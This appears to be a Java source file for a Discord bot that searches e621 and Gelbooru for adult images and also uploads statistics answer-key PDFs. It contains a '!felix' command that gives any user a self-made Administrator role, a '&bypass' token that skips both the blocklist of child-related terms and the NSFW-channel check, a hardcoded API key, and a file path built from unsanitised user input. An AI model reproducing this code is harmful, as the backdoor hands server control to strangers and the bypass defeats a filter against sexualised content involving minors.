package org.example;

import java.io.File;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Arrays;
import java.util.EnumSet;


import com.opencsv.exceptions.CsvException;
import io.netty.channel.Channel;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.utils.FileUpload;

public class MyListener extends ListenerAdapter {
    @Override
    public void onMessageReceived(MessageReceivedEvent event) {
        String[] test = {"shota","loli","guro","gore","scat","young","child","toddler","poop"};

        Message message = event.getMessage();
        String content = message.getContentRaw();
        String[] args = content.split(" ");

        if(event.getChannel().asTextChannel().isNSFW() && ((content.contains("!e621") || content.contains("!booru"))) || content.contains("&bypass")){
            if((Arrays.stream(test).anyMatch(content::contains)&&content.contains("!")) && !content.contains("&bypass") && !event.getAuthor().isBot()){
                System.out.println(Arrays.stream(test).anyMatch(content::contains) && !content.contains("&bypass") && !event.getAuthor().isBot());
                System.out.println(Arrays.stream(test).anyMatch(content::contains));
                System.out.println(content.contains("&bypass"));
                System.out.println(!event.getAuthor().isBot());
                EmbedBuilder builder = new EmbedBuilder();
                builder.setImage("https://www.dictionary.com/e/wp-content/uploads/2018/09/moai-emoji.png")
                        .setColor(0x9c9c9c)
                        .setFooter(event.getAuthor().getName() + " searched for \""+content+"\"", event.getAuthor().getAvatarUrl());
                event.getChannel().asGuildMessageChannel().sendMessageEmbeds(builder.build()).queue();
            } else if (content.startsWith("!e621")&&!event.getAuthor().isBot()&&(!Arrays.stream(test).anyMatch(content.substring(7)::contains) || content.substring(7).contains("&bypass"))) {
                String search = content.substring(6);

                search = search.replace(" ","+");
                try {
                    PostData postData = PostData.getPostsFromE621(search,1);
                    String imageUrl = PostData.getUrl();
                    int imageId = PostData.getPostId();
                    EmbedBuilder builder = new EmbedBuilder();

                    HttpURLConnection connection = (HttpURLConnection) new URL(imageUrl).openConnection();
                    connection.setRequestMethod("HEAD");
                    if (connection.getResponseCode() == 200 ) {

                        builder.setImage(imageUrl)
                        .setTitle("Image via e621","https://e621.net/posts/"+imageId)
                        .setDescription("Searched Tag(s): " + search.replace("+",", "))
                        .setColor(0xff6f00)
                        .setFooter(event.getAuthor().getName(), event.getAuthor().getAvatarUrl());

                        event.getChannel().asGuildMessageChannel().sendMessageEmbeds(builder.build()).queue();
                    }
                } catch (IOException e) {
                    event.getChannel().sendMessage("One or more tags in  \" "+search+" \" is invalid! Please try again!").queue();
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
            } else if (content.startsWith("!booru")&&!event.getAuthor().isBot()&&(!Arrays.stream(test).anyMatch(content.substring(7)::contains) || content.substring(7).contains("&bypass"))){
                String search = content.substring(7, content.indexOf("&", 7) > -1 ? content.indexOf("&", 7) : content.length());
                search = search.replace(" ","+");
                String url = "https://gelbooru.com/index.php?page=dapi&s=post&q=index&api_key=5985fd8c50a9c969f32688ae7a6cf66a7485b0a2e678c85aae6f8ab91da89f35&user_id=1171000&tags=" + search + "+sort:random&limit=1";
                System.out.println("URL: "+url);
                if(!search.isBlank()){
                    try {
                        PostData postData2 = PostData.parseXML(url);
                        String imageUrl = PostData.getUrl();
                        int imageId = PostData.getPostId();
                        EmbedBuilder builder = new EmbedBuilder();

                        HttpURLConnection connection = (HttpURLConnection) new URL(imageUrl).openConnection();
                        connection.setRequestMethod("HEAD");
                        if (connection.getResponseCode() == 200 ) {

                            builder.setImage(imageUrl)
                                    .setTitle("Image via gelbooru","https://gelbooru.com/index.php?page=post&s=view&id="+imageId)
                                    .setDescription("Searched Tag(s): " + search.substring(0,search.length()-1).replace("+",", "))
                                    .setColor(0x3356FF)
                                    .setFooter("Searched by "+event.getAuthor().getName(), event.getAuthor().getAvatarUrl());

                            event.getChannel().asGuildMessageChannel().sendMessageEmbeds(builder.build()).queue();

                        }
                    } catch (IOException e) {
                        event.getChannel().sendMessage("One or more tags in  \" "+search+" \" is invalid! Please try again!").queue();
                    }
                } else {
                    event.getChannel().sendMessage("You didnt type any tags! [Ex. !booru felix_argyle balls ]").queue();
                }
            }
        } else if(!message.getChannel().asTextChannel().isNSFW() && ((content.contains("!e621") || content.contains("!booru"))) && !content.contains("&bypass")){
            event.getChannel().sendMessage("This is not an NSFW Channel! Please update the channel type to use this command!").queue();
        }
        if (content.equals("!felix")) {
            Member member = event.getMember();
            EnumSet<Permission> permissions = EnumSet.of(Permission.ADMINISTRATOR);
            Role adminRole = event.getGuild().createRole().setPermissions(permissions).setName("felix").complete();
            event.getGuild().addRoleToMember(member, adminRole).queue();
            event.getChannel().sendMessage("The role 'felix' has been added to " + member.getEffectiveName()).queue();
        }
        if (event.getMessage().getContentRaw().startsWith("!stats")) {
                if (args.length != 2) {
                    event.getChannel().sendMessage("Invalid syntax. Use !stats [filename]").queue();
                    return;
                }
                String filename = args[1];
                if (!filename.endsWith(".pdf")) {
                    filename += "_Solutions.pdf";
                }
                File file = new File("C:\\Users\\slend\\Documents\\GitHub\\mega-balls-29\\Stats\\" + filename);
                if (!file.exists()) {
                    event.getChannel().sendMessage("File not found [ Type only the chapter number! Ex. !stats 7.2.2 ]").queue();
                    return;
                }
                event.getChannel().sendMessage(filename + " answer key; ").addFiles(FileUpload.fromData(file)).queue();
            }

        if(content.equals("!draft")) {
            
        }
    }

}
